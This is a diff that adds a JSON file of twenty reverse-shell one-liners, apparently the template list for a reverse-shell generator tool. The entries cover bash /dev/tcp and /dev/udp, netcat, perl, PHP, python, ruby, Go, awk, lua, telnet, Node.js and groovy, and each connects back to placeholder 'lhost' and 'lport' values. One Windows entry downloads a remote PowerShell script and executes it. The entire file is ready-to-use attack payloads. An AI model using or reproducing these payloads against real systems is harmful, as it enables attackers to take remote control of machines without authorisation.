@@ -1,0 +1,105 @@
+{
+    "reverse_shell_list": [
+        {
+            "id":"1",
+            "name":"bash",
+            "shell":"/bin/bash -i >& /dev/tcp/lhost/lport 0>&1"
+        },
+        {
+            "id":"2",
+            "name":"bash",
+            "shell":"/bin/bash -i >& /dev/udp/lhost/lport 0>&1"
+        },
+        {
+            "id":"3",
+            "name":"nc -c",
+            "shell":"nc -c /bin/bash lhost lport"
+        },
+        {
+            "id":"4",
+            "name":"nc -e",
+            "shell":"nc -e /bin/bash lhost lport"
+        },
+        {
+            "id":"5",
+            "name":"nc mkfifo",
+            "shell":"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc lhost lport >/tmp/f"
+        },
+        {
+            "id":"6",
+            "name":"rustcat",
+            "shell":"rcat lhost lport -r /bin/bash"
+        },
+        {
+            "id":"7",
+            "name":"perl",
+            "shell":"perl -e 'use Socket;$i=\"lhost\";$p=lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'"
+        },
+        {
+            "id":"8",
+            "name":"PHP exec",
+            "shell":"php -r '$sock=fsockopen(\"lhost\",lport);exec(\"/bin/bash <&3 >&3 2>&3\");'"
+        },
+        {
+            "id":"9",
+            "name":"PHP shell_exec",
+            "shell":"php -r '$sock=fsockopen(\"lhost\",lport);shell_exec(\"/bin/bash <&3 >&3 2>&3\");'"
+        },
+        {
+            "id":"10",
+            "name":"PHP passthru",
+            "shell":"php -r '$sock=fsockopen(\"lhost\",lport);passthru(\"/bin/bash <&3 >&3 2>&3\");'"
+        },
+        {
+            "id":"11",
+            "name":"python2 -c",
+            "shell":"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"lhost\",lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
+        },
+        {
+            "id":"12",
+            "name":"python3 -c",
+            "shell":"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"lhost\",lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
+        },
+        {
+            "id":"13",
+            "name":"ruby no-sh",
+            "shell":"ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"lhost\",\"lport\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'"
+        },
+        {
+            "id":"14",
+            "name":"golang",
+            "shell":"echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"lhost:lport\");cmd:=exec.Command(\"/bin/bash\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
+        },
+        {
+            "id":"15",
+            "name":"awk",
+            "shell":"awk 'BEGIN {s = \"/inet/tcp/0/lhost/lport\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
+        },
+        {
+            "id":"16",
+            "name":"lua -e",
+            "shell":"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('lhost','lport');os.execute('/bin/bash -i <&3 >&3 2>&3');\""
+        },
+        {
+            "id":"17",
+            "name":"telnet",
+            "shell":"TF=$(mktemp -u);mkfifo $TF && telnet lhost lport 0<$TF | /bin/bash 1>$TF"
+        },
+        {
+            "id":"18",
+            "name":"nodejs",
+            "shell":"require('child_process').exec('nc -e /bin/bash lhost lport')"
+        },
+        {
+            "id":"19",
+            "name":"windows conpty",
+            "shell":"IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell lhost lport"
+        },
+        {
+            "id":"20",
+            "name":"groovy",
+            "shell":"String host=\"lhost\";int port=lport;String cmd=\"/bin/bash\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();"
+        }
+
+    ]
+}
